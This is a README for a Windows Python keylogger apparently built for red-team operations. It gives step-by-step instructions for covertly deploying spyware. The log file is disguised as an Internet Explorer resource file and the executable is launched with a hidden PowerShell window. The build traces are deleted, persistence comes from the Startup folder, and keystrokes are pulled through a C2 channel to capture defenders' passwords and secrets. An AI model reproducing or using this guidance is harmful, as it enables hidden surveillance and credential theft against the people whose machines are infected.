# alpha-keylogger

## Overview
This tool is a Keylogger written for Windows that saves all recorded keystrokes in a specified file, which can be changed by the user.

## Requirements
- Python (works at the most recent verison 3.12.0)
- pynput module: `pip install pynput`
- pyinstaller: `pip install pyinstaller`

## Installation

1. keylogger.py Can be installed into virtually any directory (it will be deleted later).
2. Modify the `output_file` variable in the script, if desired. It current writes to `C:\Program Files (x86)\Internet Explorer\en-Us\ielang.exe.mui`
1. Package the python file using pyinstaller: `pyinstaller keylogger.py`
1. This will create an executable file located in `.\dist\pylogger\pylogger.exe`
2. Hide the `dist` directory in a clever location, and run it using `Start-Process [path to pylogger.exe] -WindowStyle Hidden -WorkingDirectory [path to dist]` **NOTE**: This requires Administrator Powershell permissions to write to the predefined output file.
3. Remove the pylogger.py file, as well as any files that were created in the process. `pylogger.exe` will now function as a standalone executable.

## Persistance

There are a number of different methods of persistance given an executable file, but one common method is to place a shortcut or copy of the executable in Startup folder located at `C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

## Usage

This tool is meant to complement an existing C2 for intial access. Using an external C2, the output file can be read to uncover Blue Teamers passwords, previous commands, and anything other secrets they may have typed.

